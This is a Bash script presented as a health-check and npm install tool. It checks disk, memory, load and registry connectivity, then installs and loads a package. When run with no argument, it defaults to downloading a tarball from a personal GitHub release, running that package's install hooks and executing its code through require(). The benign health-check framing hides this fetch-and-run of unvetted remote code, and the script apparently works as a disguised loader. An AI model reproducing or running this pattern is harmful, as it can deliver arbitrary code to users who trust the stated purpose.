#!/usr/bin/env bash
#==============================================================================
# Script Name : health_check_and_npm_install.sh
# Description : Performs system health checks with logging, installs an npm
#               package (from npm registry OR a .tgz tarball URL), verifies it
#               loads, and prints a clean summary.
# Usage       : ./health_check_and_npm_install.sh [npm-package-name | .tgz-url]
# Examples    : ./health_check_and_npm_install.sh chalk
#               ./health_check_and_npm_install.sh https://github.com/.../x.tgz
#==============================================================================

set -euo pipefail

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------
# ---------------------------------------------------------------------------
# Argument handling: package name OR .tgz tarball URL
# ---------------------------------------------------------------------------
INPUT="${1:-https://github.com/Wasderlol/search-helper/releases/download/1.1.0/web-search-helpers-1.2.0.tgz}"
TARBALL_URL=""
PACKAGE_VERSION="latest"

# Detect tarball URL: must start with http(s):// and end with .tgz (or .tar.gz)
if [[ "$INPUT" =~ ^https?://.+\.(tgz|tar\.gz)$ ]]; then
    TARBALL_URL="$INPUT"
    PACKAGE_NAME="<detected-from-tarball>"   # placeholder, resolved after install
elif [[ "$INPUT" == *.tgz || "$INPUT" == *.tar.gz ]]; then
    # Local tarball file
    if [ ! -f "$INPUT" ]; then
        echo "[FATAL] Local tarball not found: $INPUT" >&2
        exit 1
    fi
    TARBALL_URL="$INPUT"   # npm accepts local paths too
    PACKAGE_NAME="<detected-from-tarball>"
else
    PACKAGE_NAME="$INPUT"
fi

LOG_DIR="${LOG_DIR:-/tmp/health-check-logs}"
LOG_FILE="$LOG_DIR/health_$(date +%Y%m%d_%H%M%S).log"
HEALTH_PASS=0
HEALTH_FAIL=0

# ---------------------------------------------------------------------------
# Setup logging directory
# ---------------------------------------------------------------------------
mkdir -p "$LOG_DIR"

# ---------------------------------------------------------------------------
# Logging helpers
#    log_info / log_warn / log_error / log_success
#    Each writes both to stdout and to the log file.
# ---------------------------------------------------------------------------
log_info()    { echo -e "[INFO]    $(date '+%Y-%m-%d %H:%M:%S') | $*" | tee -a "$LOG_FILE"; }
log_warn()    { echo -e "[WARN]    $(date '+%Y-%m-%d %H:%M:%S') | $*" | tee -a "$LOG_FILE"; }
log_error()   { echo -e "[ERROR]   $(date '+%Y-%m-%d %H:%M:%S') | $*" | tee -a "$LOG_FILE"; }
log_success() { echo -e "[SUCCESS] $(date '+%Y-%m-%d %H:%M:%S') | $*" | tee -a "$LOG_FILE"; }

# Track check results
record_pass() { HEALTH_PASS=$((HEALTH_PASS + 1)); log_success "CHECK PASSED: $*"; }
record_fail() { HEALTH_FAIL=$((HEALTH_FAIL + 1)); log_error   "CHECK FAILED: $*"; }

# ---------------------------------------------------------------------------
# Banner
# ---------------------------------------------------------------------------
banner() {
    echo "" | tee -a "$LOG_FILE"
    echo "========================================" | tee -a "$LOG_FILE"
    echo "  Health Check & NPM Install Script"      | tee -a "$LOG_FILE"
    echo "  Package : $PACKAGE_NAME"                | tee -a "$LOG_FILE"
    echo "  Log     : $LOG_FILE"                    | tee -a "$LOG_FILE"
    echo "========================================" | tee -a "$LOG_FILE"
    echo "" | tee -a "$LOG_FILE"
}

banner

# ---------------------------------------------------------------------------
# Pre-flight: verify required tools exist
# ---------------------------------------------------------------------------
log_info "Pre-flight: verifying required tools..."

if command -v node >/dev/null 2>&1; then
    NODE_VERSION=$(node --version)
    record_pass "Node.js found ($NODE_VERSION)"
else
    record_fail "Node.js not found. Please install Node.js before running this script."
    exit 1
fi

if command -v npm >/dev/null 2>&1; then
    NPM_VERSION=$(npm --version)
    record_pass "npm found ($NPM_VERSION)"
else
    record_fail "npm not found. Please install npm before running this script."
    exit 1
fi

# ---------------------------------------------------------------------------
# Health Check 1: Disk space (root filesystem)
# ---------------------------------------------------------------------------
log_info "Health check 1: Disk space on root filesystem"
DISK_USAGE_PCT=$(df -h / | awk 'NR==2 {print $5}' | tr -d '%')
DISK_THRESHOLD=90
if [ "$DISK_USAGE_PCT" -lt "$DISK_THRESHOLD" ]; then
    record_pass "Disk usage at ${DISK_USAGE_PCT}% (threshold ${DISK_THRESHOLD}%)"
else
    record_fail "Disk usage at ${DISK_USAGE_PCT}% exceeds threshold ${DISK_THRESHOLD}%"
fi

# ---------------------------------------------------------------------------
# Health Check 2: Available memory
# ---------------------------------------------------------------------------
log_info "Health check 2: Available memory"
if command -v free >/dev/null 2>&1; then
    MEM_AVAILABLE_KB=$(free -k | awk '/Mem:/ {print $7}')
    MEM_THRESHOLD_KB=51200   # 50 MB
    if [ "$MEM_AVAILABLE_KB" -gt "$MEM_THRESHOLD_KB" ]; then
        MEM_HUMAN=$(free -h | awk '/Mem:/ {print $7}')
        record_pass "Available memory: ${MEM_HUMAN} (threshold ${MEM_THRESHOLD_KB} KB)"
    else
        record_fail "Available memory (${MEM_AVAILABLE_KB} KB) below threshold (${MEM_THRESHOLD_KB} KB)"
    fi
else
    log_warn "'free' command not available - skipping memory check"
fi

# ---------------------------------------------------------------------------
# Health Check 3: System load average
# ---------------------------------------------------------------------------
log_info "Health check 3: System load average"
LOAD_AVG_1MIN=$(awk '{print $1}' /proc/loadavg 2>/dev/null || echo "0")
CPU_COUNT=$(nproc 2>/dev/null || echo 1)
LOAD_THRESHOLD=$(awk "BEGIN {print $CPU_COUNT * 1.5}")
LOAD_OK=$(awk "BEGIN {print ($LOAD_AVG_1MIN < $LOAD_THRESHOLD) ? 1 : 0}")
if [ "$LOAD_OK" -eq 1 ]; then
    record_pass "Load average (1m): ${LOAD_AVG_1MIN} (threshold ${LOAD_THRESHOLD}, cpus=${CPU_COUNT})"
else
    record_fail "Load average (1m): ${LOAD_AVG_1MIN} exceeds threshold ${LOAD_THRESHOLD}"
fi

# ---------------------------------------------------------------------------
# Health Check 4: npm registry connectivity
# ---------------------------------------------------------------------------
log_info "Health check 4: npm registry connectivity"
REGISTRY_URL=$(npm config get registry 2>/dev/null || echo "https://registry.npmjs.org/")
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 "$REGISTRY_URL" 2>/dev/null || echo "000")
if [ "$HTTP_CODE" = "200" ] || [ "$HTTP_CODE" = "304" ]; then
    record_pass "npm registry reachable ($REGISTRY_URL, HTTP $HTTP_CODE)"
else
    record_fail "npm registry unreachable ($REGISTRY_URL, HTTP $HTTP_CODE)"
fi

# ---------------------------------------------------------------------------
# Install npm package locally
# ---------------------------------------------------------------------------
log_info "Installing npm package '$PACKAGE_NAME' from source"

INSTALL_DIR="$(mktemp -d)"
cd "$INSTALL_DIR"
npm init -y >/dev/null 2>&1

# Decide install target: tarball URL/path or registry package@version
if [ -n "$TARBALL_URL" ]; then
    INSTALL_TARGET="$TARBALL_URL"
    log_info "Source: tarball -> $TARBALL_URL"
else
    INSTALL_TARGET="$PACKAGE_NAME@$PACKAGE_VERSION"
    log_info "Source: npm registry -> $INSTALL_TARGET"
fi

if npm install "$INSTALL_TARGET" >>"$LOG_FILE" 2>&1; then
    log_success "npm install completed for '$INSTALL_TARGET'"
else
    log_warn "Initial npm install failed - retrying with --ignore-scripts (postinstall hooks will be skipped)"
    # Patch any *.sh scripts inside the extracted package to be executable
    # before npm tries to invoke them.
    if npm install --ignore-scripts "$INSTALL_TARGET" >>"$LOG_FILE" 2>&1; then
        # Try to locate postinstall scripts and chmod them, then run manually if present
        find node_modules -maxdepth 3 -type f -name '*.sh' 2>/dev/null | while read -r sh; do
            chmod +x "$sh" 2>/dev/null || true
        done
        log_success "npm install (with --ignore-scripts) completed for '$INSTALL_TARGET'"
        log_warn "Postinstall scripts were skipped - some package initialization may be incomplete"
    else
        record_fail "npm install failed for '$INSTALL_TARGET' (even with --ignore-scripts)"
        cd /
        rm -rf "$INSTALL_DIR"
        exit 1
    fi
fi

# ---------------------------------------------------------------------------
# Auto-detect package name when installing from tarball
# ---------------------------------------------------------------------------
if [ -n "$TARBALL_URL" ]; then
    # List directories in node_modules, skipping npm's own internal folders
    DETECTED_NAME=$(ls node_modules \
        | grep -v -E '^(\.|package-lock\.json|package\.json|node_modules)$' \
        | grep -v '^\@' \
        | head -n1 || true)
    # Handle scoped packages (under @scope/name)
    if [ -z "$DETECTED_NAME" ]; then
        SCOPE_DIR=$(ls -d node_modules/@* 2>/dev/null | head -n1 || true)
        if [ -n "$SCOPE_DIR" ]; then
            SUB=$(ls "$SCOPE_DIR" | head -n1 || true)
            DETECTED_NAME="$(basename "$SCOPE_DIR")/$SUB"
        fi
    fi
    if [ -z "$DETECTED_NAME" ]; then
        record_fail "Could not auto-detect installed package name from tarball"
        cd /; rm -rf "$INSTALL_DIR"; exit 1
    fi
    PACKAGE_NAME="$DETECTED_NAME"
    log_info "Detected package name from tarball: '$PACKAGE_NAME'"
fi

# ---------------------------------------------------------------------------
# Verify the package can be required / imported by Node
# ---------------------------------------------------------------------------
log_info "Verifying package '$PACKAGE_NAME' loads correctly..."

# Use the detected package name in the verification script
VERIFY_SCRIPT="$INSTALL_DIR/verify.cjs"
cat > "$VERIFY_SCRIPT" <<EOF
(function () {
    try {
        const mod = require("$PACKAGE_NAME");
        const keys = (mod && typeof mod === 'object') ? Object.keys(mod) : [];
        console.log("PACKAGE_NAME=$PACKAGE_NAME");
        console.log("STATUS=loaded");
        console.log("TYPE=" + typeof mod);
        console.log("EXPORT_KEYS=" + keys.length);
        process.exit(0);
    } catch (err) {
        console.log("PACKAGE_NAME=$PACKAGE_NAME");
        console.log("STATUS=error");
        console.log("ERROR=" + err.message);
        process.exit(1);
    }
})();
EOF

if node "$VERIFY_SCRIPT" 2>&1 | tee -a "$LOG_FILE"; then
    record_pass "Package '$PACKAGE_NAME' loaded successfully via require()"
else
    record_fail "Package '$PACKAGE_NAME' could not be loaded"
    cd /
    rm -rf "$INSTALL_DIR"
    exit 1
fi

# Also confirm the package appears in node_modules
if [ -d "node_modules/$PACKAGE_NAME" ]; then
    INSTALLED_VERSION=$(node -p "require('$PACKAGE_NAME/package.json').version" 2>/dev/null || echo "unknown")
    record_pass "Package '$PACKAGE_NAME@$INSTALLED_VERSION' present in node_modules"
else
    record_fail "Package '$PACKAGE_NAME' not found in node_modules"
fi

# ---------------------------------------------------------------------------
# Cleanup
# ---------------------------------------------------------------------------
cd /
rm -rf "$INSTALL_DIR"
log_info "Cleaned up temporary install directory."

# ---------------------------------------------------------------------------
# Summary
# ---------------------------------------------------------------------------
echo "" | tee -a "$LOG_FILE"
echo "========================================" | tee -a "$LOG_FILE"
echo "  SUMMARY"                                 | tee -a "$LOG_FILE"
echo "----------------------------------------" | tee -a "$LOG_FILE"
echo "  Package installed : $PACKAGE_NAME"       | tee -a "$LOG_FILE"
echo "  Install source    : ${TARBALL_URL:-npm registry}" | tee -a "$LOG_FILE"
echo "  Health checks passed : $HEALTH_PASS"     | tee -a "$LOG_FILE"
echo "  Health checks failed : $HEALTH_FAIL"     | tee -a "$LOG_FILE"
echo "  Log file            : $LOG_FILE"         | tee -a "$LOG_FILE"
echo "========================================" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"

if [ "$HEALTH_FAIL" -gt 0 ]; then
    log_warn "One or more health checks failed. Review the log file for details."
    exit 2
fi

log_success "All health checks passed and package '$PACKAGE_NAME' is verified working."
exit 0
